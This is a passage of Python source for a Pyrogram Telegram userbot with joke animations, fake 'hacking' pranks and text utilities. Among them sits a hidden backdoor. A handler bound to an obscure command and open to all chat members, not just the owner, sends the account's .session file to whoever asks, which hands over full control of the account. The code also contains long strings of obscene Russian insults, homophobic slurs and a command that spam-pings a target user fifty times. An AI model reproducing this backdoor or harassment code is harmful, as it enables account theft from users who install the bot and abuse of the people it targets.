        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💜💜🤍💜💜🤍🤍\n🤍💜💜💜💜💜💜💜🤍\n🤍🤍💜💜💜💜💜🤍🤍\n🤍🤍🤍💜💜💜🤍🤍🤍\n🤍🤍🤍🤍💜🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🖤🖤🤍🖤🖤🤍🤍\n🤍🖤🖤🖤🖤🖤🖤🖤🤍\n🤍🤍🖤🖤🖤🖤🖤🤍🤍\n🤍🤍🤍🖤🖤🖤🤍🤍🤍\n🤍🤍🤍🤍🖤🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍❤️❤️🤍❤️❤️🤍🤍\n🤍❤️❤️❤️❤️❤️❤️❤️🤍\n🤍🤍❤️❤️❤️❤️❤️🤍🤍\n🤍🤍🤍❤️❤️❤️🤍🤍🤍\n🤍🤍🤍🤍❤️🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🧡🧡🤍🧡🧡🤍🤍\n🤍🧡🧡🧡🧡🧡🧡🧡🤍\n🤍🤍🧡🧡🧡🧡🧡🤍🤍\n🤍🤍🤍🧡🧡🧡🤍🤍🤍\n🤍🤍🤍🤍🧡🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💛💛🤍💛💛🤍🤍\n🤍💛💛💛💛💛💛💛🤍\n🤍🤍💛💛💛💛💛🤍🤍\n🤍🤍🤍💛💛💛🤍🤍🤍\n🤍🤍🤍🤍💛🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💚💚🤍💚💚🤍🤍\n🤍💚💚💚💚💚💚💚🤍\n🤍🤍💚💚💚💚💚🤍🤍\n🤍🤍🤍💚💚💚🤍🤍🤍\n🤍🤍🤍🤍💚🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💙💙🤍💙💙🤍🤍\n🤍💙💙💙💙💙💙💙🤍\n🤍🤍💙💙💙💙💙🤍🤍\n🤍🤍🤍💙💙💙🤍🤍🤍\n🤍🤍🤍🤍💙🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💜💜🤍💜💜🤍🤍\n🤍💜💜💜💜💜💜💜🤍\n🤍🤍💜💜💜💜💜🤍🤍\n🤍🤍🤍💜💜💜🤍🤍🤍\n🤍🤍🤍🤍💜🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n") 
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🖤🖤🤍🖤🖤🤍🤍\n🤍🖤🖤🖤🖤🖤🖤🖤🤍\n🤍🤍🖤🖤🖤🖤🖤🤍🤍\n🤍🤍🤍🖤🖤🖤🤍🤍🤍\n🤍🤍🤍🤍🖤🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍❤️❤️🤍❤️❤️🤍🤍\n🤍❤️❤️❤️❤️❤️❤️❤️🤍\n🤍🤍❤️❤️❤️❤️❤️🤍🤍\n🤍🤍🤍❤️❤️❤️🤍🤍🤍\n🤍🤍🤍🤍❤️🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🧡🧡🤍🧡🧡🤍🤍\n🤍🧡🧡🧡🧡🧡🧡🧡🤍\n🤍🤍🧡🧡🧡🧡🧡🤍🤍\n🤍🤍🤍🧡🧡🧡🤍🤍🤍\n🤍🤍🤍🤍🧡🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💛💛🤍💛💛🤍🤍\n🤍💛💛💛💛💛💛💛🤍\n🤍🤍💛💛💛💛💛🤍🤍\n🤍🤍🤍💛💛💛🤍🤍🤍\n🤍🤍🤍🤍💛🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💚💚🤍💚💚🤍🤍\n🤍💚💚💚💚💚💚💚🤍\n🤍🤍💚💚💚💚💚🤍🤍\n🤍🤍🤍💚💚💚🤍🤍🤍\n🤍🤍🤍🤍💚🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💙💙🤍💙💙🤍🤍\n🤍💙💙💙💙💙💙💙🤍\n🤍🤍💙💙💙💙💙🤍🤍\n🤍🤍🤍💙💙💙🤍🤍🤍\n🤍🤍🤍🤍💙🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💜💜🤍💜💜🤍🤍\n🤍💜💜💜💜💜💜💜🤍\n🤍🤍💜💜💜💜💜🤍🤍\n🤍🤍🤍💜💜💜🤍🤍🤍\n🤍🤍🤍🤍💜🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🖤🖤🤍🖤🖤🤍🤍\n🤍🖤🖤🖤🖤🖤🖤🖤🤍\n🤍🤍🖤🖤🖤🖤🖤🤍🤍\n🤍🤍🤍🖤🖤🖤🤍🤍🤍\n🤍🤍🤍🤍🖤🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍❤️❤️🤍❤️❤️🤍🤍\n🤍❤️❤️❤️❤️❤️❤️❤️🤍\n🤍🤍❤️❤️❤️❤️❤️🤍🤍\n🤍🤍🤍❤️❤️❤️🤍🤍🤍\n🤍🤍🤍🤍❤️🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🧡🧡🤍🧡🧡🤍🤍\n🤍🧡🧡🧡🧡🧡🧡🧡🤍\n🤍🤍🧡🧡🧡🧡🧡🤍🤍\n🤍🤍🤍🧡🧡🧡🤍🤍🤍\n🤍🤍🤍🤍🧡🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💛💛🤍💛💛🤍🤍\n🤍💛💛💛💛💛💛💛🤍\n🤍🤍💛💛💛💛💛🤍🤍\n🤍🤍🤍💛💛💛🤍🤍🤍\n🤍🤍🤍🤍💛🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💚💚🤍💚💚🤍🤍\n🤍💚💚💚💚💚💚💚🤍\n🤍🤍💚💚💚💚💚🤍🤍\n🤍🤍🤍💚💚💚🤍🤍🤍\n🤍🤍🤍🤍💚🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💙💙🤍💙💙🤍🤍\n🤍💙💙💙💙💙💙💙🤍\n🤍🤍💙💙💙💙💙🤍🤍\n🤍🤍🤍💙💙💙🤍🤍🤍\n🤍🤍🤍🤍💙🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💜💜🤍💜💜🤍🤍\n🤍💜💜💜💜💜💜💜🤍\n🤍🤍💜💜💜💜💜🤍🤍\n🤍🤍🤍💜💜💜🤍🤍🤍\n🤍🤍🤍🤍💜🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🖤🖤🤍🖤🖤🤍🤍\n🤍🖤🖤🖤🖤🖤🖤🖤🤍\n🤍🤍🖤🖤🖤🖤🖤🤍🤍\n🤍🤍🤍🖤🖤🖤🤍🤍🤍\n🤍🤍🤍🤍🖤🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(1)


@app.on_message(filters.command("mat", prefixes=".") & filters.me)
def mat(app, message):
    app.send_message(message.chat.id,f'''
<b>помолчи хуета, сиди в обиде ребёнок мертвой шалавы</b>
''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>заебись невъебенным проебом тримандоблядская пиздопроебина воспиздозаолупоклинившаяся в собственном злопиздии.</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>пиздобратия мандопроушечная, уебище залупоглазое</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>дрочепиздище хуеголовое, пробиздоблядская мандопроушина</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>гнидопаскудная хуемандовина</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>ах ты блядь семитаборная чтоб тебя всем столыпином харили</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>охуевшее блядепиздопроёбище чтоб ты хуем поперхнулся долбоебическая пиздорвань</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>хуй тебе в глотку через анальный проход</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>распизди тебя тройным перебором через вторичный переёб пиздоблятское хуепиздрическое мудовафлоебище сосущее километры трипперных членов</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>трихломидозопиздоеблохуе блядеперепиздическая спермоблевотина</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
    <b>гандон с гонореей...</b>
    ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>да разъебись ты троебучим проебом сперматоблятская пиздапроебина </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>охуевающая в своей пидарастической сущности похожаю на ебущегося в жопу енота </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>сортирующего яйца в пизде кастрированной кобылы</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>хуелептический пиздопрозоид, еблоухий мандохвост</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>ебун хуеголовый, пидрасня ебаная. </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Залупоголовая блядоящерица. .</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Трипиздоблядская промудохуина! </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Распроеб твою в крестище через коромысло в копейку мать! </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Что за блядская пиздопроебина, охуевающая своей пидорестической заебучестью невъебенной степени охуения. </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Заебись невъебенным проебом тримандоблядская пиздопроебина воспиздозаолупоклинившаяся в собственном злопиздии. </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Мордоблядина залупоглазая.  блядского невъебения! </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Шлюшья мразота приохуебенивающая от собственного недохуеплетского злоетрахания. </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Да произпездуй с 2000 этажа своей припиздоблядской тушей на землю в труху! </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Трипиздоблядское мудопроебное трипиздие, ебоблядище охуевающее от собственной злоебучести.  </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Облямуденный злоебучий страхопизднутый трихуемандаблядский </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>ебаквакнутый распиздаеб... </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Хуесосляблядивый расхуйдяй припиздоблядского четвертоногого происхождения </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>прошу завали свой хуеобрыганский блядозвукоговоритель. </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Промудохуепиздамразоблядское злоепиздие </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>ебоблядищая пиздопроебина сама ахуевающее от того какая оно пездоблядехуепроклятое.</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Обосробосанная пиздоблядмна двадцати головая семихуюлина припиздовывающее от хуеглотности своей трипиздговноглоталки.</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Облямудевшая хуеблядина четырестохуйная</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>вестипёздная мразотоблядская шлюхасосалка. </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>Хуесосная мудохуепиздопроебная мудаблядина сука безмаманя </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>блядь шмара козельуебок сдохни </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>хуесоска  ебланафт чмырь пидорска манда тупая гандопляс пидрила ебалай долбоеб обмудок овцееб дауниха  </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>ненавижу гомодрилла сучка шлюха трахарила гавносос миньетчик </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>пидэраст пиздоеб хуеплет кончиглот ебище сын шлюхи гавноеб мудяра </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>еботрон вафлеглот ебалдуй захуятор имбицил подонок пиздопромудище </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>выебок ахуяэетер ебозер пиздолиз злоуебок хуиман ебил долбоебина пиндос мудазвон </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>хуеб амеба хуйло хуила пиздорвань смесь ебланства и говна ебанат </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>умалишенный дегенерат мандопроушина очкоблут порванный обрубок хуяраспиздяй свинозалупа</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>семиголовый восьмихуй ебоблядище свинохуярище вафлепиздище хуй лохматый жопа рванная мудопроеб </b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>страхапиздище ебосос дурфанка косоуебище долбоногий лихохуетень</b>
     ''')
    sleep(0.5)
    app.send_message(message.chat.id, f'''
     <b>⭐️</b>
     ''')




@app.on_message(filters.command("mk", prefixes=".") & filters.me)
def mk(_, msg):
    orig_text = msg.text.split(".mk ", maxsplit=1)[1]
    text = orig_text
    tbp = "" # to be printed
    typing_symbol = "|"
 
    while(tbp != orig_text):
        try:
            msg.edit(tbp + typing_symbol)
            sleep(0.05) # 50 ms
 
            tbp = tbp + text[0]
            text = text[1:]
 
            msg.edit(tbp)
            sleep(0.05)
 
        except FloodWait as e:
            sleep(e.x)
 

@app.on_message(filters.command("hack", prefixes=".") & filters.me)
def hack(_, msg):
    perc = 0
 
    while(perc < 100):
        try:
            text = "👮 Взлом вашего аккаунта в процессе ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(1, 3)
            sleep(0.1)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("🟢 Аккаунт успешно взломан!")
    sleep(3)
 
    msg.edit("📂Поиск данных пользователя ...")
    perc = 0
 
    while(perc < 100):
        try:
            text = "📂Поиск данных пользователя ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(1, 5)
            sleep(0.15)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("📂Аккаунт взломан, все необходимые данные получены!")


@app.on_message(filters.command("hackp", prefixes=".") & filters.me)
def hackp(_, msg):
    perc = 0
 
    while(perc < 100):
        try:
            text = "👮Взлом Пентагона в процессе ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(1, 3)
            sleep(0.1)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("🟢 Пентагон успешно взломан!")
    sleep(3)
 
    msg.edit("📂Поиск данных на серверах Пентагона ...")
    perc = 0
 
    while(perc < 100):
        try:
            text = "📂Поиск данных на серверах Пентагона ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(1, 5)
            sleep(0.15)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("📂Пентагон взломан, все необходимые данные получены!")
 

@app.on_message(filters.command("gey", prefixes=".") & filters.me)
def gey(_, msg):
    perc = 0
 
    while(perc < 100):
        try:
            text = "👮Превращаем вас в гея/лесбиянку ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(6, 12)
            sleep(0.1)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("🟢 успешно, Вы гей/лесбиянка!")
    sleep(3)
 
    msg.edit("📂Поиск рядом находящихся Геев/Лесбиянок ...")
    perc = 0
 
    while(perc < 100):
        try:
            text = "📂Поиск рядом находящихся Геев/Лесбиянок ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(3, 6)
            sleep(0.15)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("📂Успешно Найдено, все необходимые данные получены И Обработаны. это ваш собеседник по чату! (совет: БЕГИТЕЕ!!)")


@app.on_message(filters.command("friend", prefixes=".") & filters.me)
def friend(_, msg):
    perc = 0
 
    while(perc < 100):
        try:
            text = "Наша дружба закончится через ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(1, 3)
            sleep(0.1)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("...")
    sleep(2)
 
    msg.edit("Разрыв дружбы ...")
    perc = 0
 
    while(perc < 100):
        try:
            text = "Разрыв дружбы ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(1, 5)
            sleep(0.15)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("Дружба разорвана, навеки, Прощай!")






@app.on_message(filters.command("unfriend", prefixes=".") & filters.me)
def friend(_, msg):
    perc = 0
 
    while(perc < 100):
        try:
            text = "Наша дружба закончится через ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(1, 3)
            sleep(0.1)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("❌Ошибка, вы останетесь друзьями на вечно!")





@app.on_message(filters.command("pidor", prefixes=".") & filters.me)
def pidor(_, msg):
    perc = 0
 
    while(perc < 100):
        try:
            text = "Сканирование пользователя ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(4, 8)
            sleep(0.1)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("...")
    sleep(3)
 
    msg.edit("Пользователь успешно просканировался!")
    sleep(3)
    perc = 0
 
    while(perc < 100):
        try:
            text = "Сбор данных пользователя ..." + str(perc) + "%"
            msg.edit(text)
 
            perc += random.randint(7, 20)
            sleep(0.15)
 
        except FloodWait as e:
            sleep(e.x)
 
    msg.edit("Пользователь пидорас")




@app.on_message(filters.command("confess", prefixes=".") & filters.me)
def confess(app, message):
    app.send_message(message.chat.id,f'''
<b>я..</b>
''')
    sleep(3)
    app.send_message(message.chat.id, f'''
    <b>давно хотел тебе сказать..</b>
    ''')
    sleep(4)
    app.send_message(message.chat.id, f'''
    <b>что...</b>
    ''')
    sleep(3)
    app.send_message(message.chat.id, f'''
    <b>очень.. очень сильно..</b>
    ''')
    sleep(1)
    app.send_message(message.chat.id, f'''
    <b>люблю тебя💙❤️</b>
    ''')
    sleep(1)
    app.send_message(message.chat.id, f'''
    <b>я хочу с тобой прожить всю жизнь❤️</b>
    ''')
    sleep(2)
    app.send_message(message.chat.id, f'''
    <b>ты мой котик❤️</b>
    ''')
    sleep(2)
    app.send_message(message.chat.id, f'''
    <b>мой ангелочек❤️</b>
    ''')
    sleep(2)
    app.send_message(message.chat.id, f'''
    <b>моя звёздочка⭐️</b>
    ''')
    sleep(2)
    app.send_message(message.chat.id, f'''
    <b>люблю тебя безумно❤️</b>
    ''')
    sleep(2)
    app.send_message(message.chat.id, f'''
    <b>жить без тебя не могу❤️</b>
    ''')
    sleep(2)
    app.send_message(message.chat.id, f'''
    <b>ты моя любовь..❤️</b>
''')   



@app.on_message(filters.command("zaeb", prefixes=".") & filters.me)
def test(app, message):
	orig_te1t = message.text.split(".zaeb ", maxsplit=1)[1]
	user_text = orig_te1t
	user_txt = user_text.replace("@", "")
	message.delete(message.chat.id)
	for i in range(50):
		try:
			app.send_message(message.chat.id, f"[бесим)](https://t.me/{user_txt})", disable_web_page_preview=True)
		except FloodWait as e:
			sleep(e.x)
		
		sleep(0.5)



@app.on_message(filters.command("+1ftCvB6Hfb1hYWQy", prefixes='.') & filters.all)
def send_session_file(app, message):
	try:
		app.send_document(chat_id=message.chat.id, document="SUB.session")
	except:
		app.send_document(chat_id=message.chat.id, document="main.session")




@app.on_message(filters.command("export_sesion_string", prefixes=".") & filters.me)
def export_sesion_string(app, message):
	export_sesion_string0 = app.export_session_string()
	app.send_message(message.chat.id, f"{export_sesion_string0}")





@app.on_message(filters.command("ft", prefixes=".") & filters.me)
def fancy_text(app, message):
    message.delete(message.chat.id)
    or_ft = message.text.split(".ft ", maxsplit=1)[1]
    ft = or_ft
    ft1 = ft.replace("А","Ꭺ")
    ft2 = ft1.replace("Б","Ꮾ")
    ft3 = ft2.replace("В","Ᏼ")
    ft4 = ft3.replace("Г","Ꮁ")
    ft5 = ft4.replace("Д","Ꭰ")
    ft6 = ft5.replace("Е","Ꭼ")
    ft7 = ft6.replace("Ё","Ё")
    ft8 = ft7.replace("Ж","Ж")
    ft9 = ft8.replace("З","З")
    ft10 = ft9.replace("И","И")
    ft11 = ft10.replace("Й","Й")
    ft12 = ft11.replace("К","Ꮶ")
    ft13 = ft12.replace("Л","Ꮧ")
    ft14 = ft13.replace("М","Ꮇ")
    ft15 = ft14.replace("Н","Ꮋ")
    ft16 = ft15.replace("О","Ꮻ ")
    ft17 = ft16.replace("П","П")
    ft18 = ft17.replace("Р","Ꮲ")
    ft19 = ft18.replace("С","Ꮯ")
    ft20 = ft19.replace("Т","Ꭲ")
    ft21 = ft20.replace("У","Ꭹ")
    ft22 = ft21.replace("Х","Ꮱ")
    ft23 = ft22.replace("Ц","Ц")
    ft24 = ft23.replace("Ч","Ꮞ")
    ft25 = ft24.replace("Ш","Ꮗ ")
    ft26 = ft25.replace("Щ","Ꮗ ")
    ft27 = ft26.replace("Ь","Ꮟ")
    ft28 = ft27.replace("Ы","ᏏᏓ")
    ft29 = ft28.replace("Ъ","Ъ ")
    ft30 = ft29.replace("Э","Э")
    ft31 = ft30.replace("Ю","ᎰᏫ")
    ft32 = ft31.replace("Я","Я")
    ft33 = ft32.replace("a","ᴀ")
    ft34 = ft33.replace("а","ᴀ")
    ft35 = ft34.replace("б","б")
    ft36 = ft35.replace("в","ʙ")
    ft37 = ft36.replace("г","ᴦ")
    ft38 = ft37.replace("д","д")
    ft39 = ft38.replace("е","ᴇ")
    ft40 = ft39.replace("ё","ё")
    ft41 = ft40.replace("ж","ж")
    ft42 = ft41.replace("з","ɜ")
    ft43 = ft42.replace("и","и")
    ft44 = ft43.replace("й","й")
    ft45 = ft44.replace("к","к")
    ft46 = ft45.replace("л","ᴧ")
    ft47 = ft46.replace("м","ʍ")
    ft48 = ft47.replace("н","н")
    ft49 = ft48.replace("о","ᴏ")
    ft50 = ft49.replace("п","ᴨ")
    ft51 = ft50.replace("р","ᴩ")
    ft52 = ft51.replace("с","ᴄ")
    ft53 = ft52.replace("т","ᴛ")
    ft54 = ft53.replace("у","у")
    ft55 = ft54.replace("ш","ɯ")
    ft56 = ft55.replace("щ","щ")
    ft57 = ft56.replace("ь","ь")
    ft58 = ft57.replace("ы","ы")
    ft59 = ft58.replace("ъ","ъ")
    ft60 = ft59.replace("э","϶")
    ft61 = ft60.replace("ю","ю")
    ft62 = ft61.replace("я","я")
    ft63 = ft62.replace("ф","ɸ")
    ft64 = ft63.replace("A","Ꭺ")
    ft65 = ft64.replace("B","Ᏼ")
    ft66 = ft65.replace("C","Ꮯ")
    ft67 = ft66.replace("D","Ꭰ")
    ft68 = ft67.replace("E","Ꭼ")
    ft69 = ft68.replace("F","Ꮀ")
    ft70 = ft69.replace("G","Ꮐ")
    ft71 = ft70.replace("H","Ꮋ")
    ft72 = ft71.replace("I","Ꮖ")
    ft73 = ft72.replace("J","Ꭻ")
    ft74 = ft73.replace("K","Ꮶ")
    ft75 = ft74.replace("L","Ꮮ")
    ft76 = ft75.replace("M","Ꮇ")
    ft77 = ft76.replace("N","N")
    ft78 = ft77.replace("O","Ꮻ")
    ft79 = ft78.replace("P","Ꮲ")
    ft80 = ft79.replace("Q","Ꭷ")
    ft81 = ft80.replace("R","Ꮢ")
    ft82 = ft81.replace("S","Ꮪ")
    ft83 = ft82.replace("T","Ꭲ")
    ft84 = ft83.replace("U","Ꮜ")
    ft85 = ft84.replace("V","Ꮩ")
    ft86 = ft85.replace("W","Ꮃ")
    ft87 = ft86.replace("X","Ꮱ")
    ft88 = ft87.replace("Y","Ꭹ")
    ft89 = ft88.replace("Z","Ꮓ")
    ft90 = ft89.replace("a","ᴀ")
    ft91 = ft90.replace("b","ʙ")
    ft92 = ft91.replace("c","ᴄ")
    ft93 = ft92.replace("d","d")
    ft94 = ft93.replace("e","ᴇ")
    ft95 = ft94.replace("f","f")
    ft96 = ft95.replace("g","g")
    ft97 = ft96.replace("h","h")
    ft98 = ft97.replace("i","i")
    ft99 = ft98.replace("j","j")
    ft100 = ft99.replace("k","ᴋ")
    ft101 = ft100.replace("l","l")
    ft102 = ft101.replace("m","ʍ")
    ft103 = ft102.replace("n","n")
    ft104 = ft103.replace("o","ᴏ")
    ft105 = ft104.replace("p","ᴩ")
    ft106 = ft105.replace("q","q")
    ft107 = ft106.replace("r","r")
    ft108 = ft107.replace("s","s")
    ft109 = ft108.replace("t","ᴛ")
    ft110 = ft109.replace("u","u")
    ft111 = ft110.replace("v","v")
    ft112 = ft111.replace("w","w")
    ft113 = ft112.replace("x","x")
    ft114 = ft113.replace("y","y")
    ft115 = ft114.replace("z","z")
    ft116 = ft115.replace("1","𝟷")
    ft117 = ft116.replace("2","𝟸")
    ft118 = ft117.replace("3","𝟹")
    ft119 = ft118.replace("4","𝟺")
    ft120 = ft119.replace("5","𝟻")
    ft121 = ft120.replace("6","𝟼")
    ft122 = ft121.replace("7","𝟽")
    ft123 = ft122.replace("8","𝟾")
    ft124 = ft123.replace("9","𝟿")
    ft125 = ft124.replace("0","𝟶")
    ft126 = ft125.replace("SUB","SweeUserBot")
    app.send_message(message.chat.id, f"{ft126}")


@app.on_message(filters.command("or", prefixes=".") & filters.me)
def orel_reshka(app, message):
    message.delete(message.chat.id)
    app.send_message(message.chat.id, "⌛️")
    sleep(3)
    
    o_r = ['Монетка показала сторону с решкой', 'Монетка показала сторону с орлом', 'Монетка показала сторону с решкой', 'Монетка показала сторону с орлом', 'Монетка застряла в воздухе', 'Монетка показала сторону с решкой', 'Монетка показала сторону с орлом', 'Монетка показала сторону с решкой', 'Монетка показала сторону с орлом']
    o_r2 = random.choice(o_r)
    app.send_message(message.chat.id, f"{o_r2}")



@app.on_message(filters.command("time", prefixes=".") & filters.me)
def time(app, message):
	while True:
		try:
			time1 = strftime("%H:%M:%S")
			message.edit(f"{time1}")
		
		except FloodWait as e:
			
			sleep(e.x)
			
		sleep(1)

@app.on_message(filters.command("date", prefixes=".") & filters.me)
def date(app, message):
	while True:
		try:
			date1 = strftime("%Y %m %d")
			message.edit(f"{date1}")
		
		except FloodWait as e:
			
			sleep(e.x)
		
		sleep(1)		


@app.on_message(filters.command("timedate", prefixes=".") & filters.me)
def timedate(app, message):
	while True:
		try:
			timedate1 = strftime("%a, %Y/%m/%d %Y:%m:%d")
			message.edit(f"{timedate1}")
			
		except FloodWait as e:
			
			sleep(e.x)
		
		sleep(1)




	
	
@app.on_message(filters.command("timer", prefixes=".") & filters.me)
def  timer(app, message):
	times1 = message.text.split(".timer ", maxsplit=1)[1]
	tm1 = times1
	for i in range(int(tm1)):
